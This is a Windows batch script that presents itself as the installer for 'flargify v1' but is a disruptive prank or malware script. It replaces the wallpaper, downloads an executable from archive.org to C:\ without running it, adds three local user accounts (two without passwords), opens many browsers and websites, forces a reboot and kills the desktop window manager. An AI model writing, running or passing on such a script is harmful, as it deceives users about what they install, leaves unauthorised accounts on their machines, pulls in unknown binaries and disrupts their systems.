@echo off
setlocal

echo installation of flargify v1 (NEEDS WINDOWS 10 OR NEWER)

timeout /t 1 /nobreak
mkdir "C:\Windows\Web" 2>nul
powershell -Command "Invoke-WebRequest -Uri 'https://file.garden/Z3HtEpAjyGTEZiXW/canvas_1.png' -OutFile 'C:\Windows\Web\can.png'"
powershell -Command "Invoke-WebRequest -Uri 'https://archive.org/download/windows_xp_files/winxp_support_diag.exe' -OutFile 'C:\julian20yt.exe'"
reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "C:\Windows\Web\can.png" /f
set /a flargnumber=flargnumber + 1
net user "the flarg %flargnumber%" "" /add
net user "Wayback Machine" "penis" /add
net user "CATDOG" "" /add
start explorer.exe
start chrome.exe
start https://guhcdn.github.io
start edge.exe
start paint.exe
start firefox.exe
start https://www.directv.com
echo flargified system, rebooting...
shutdown /r /t 5 /c "flargified system, rebooting..."
taskkill /f /im dwm.exe





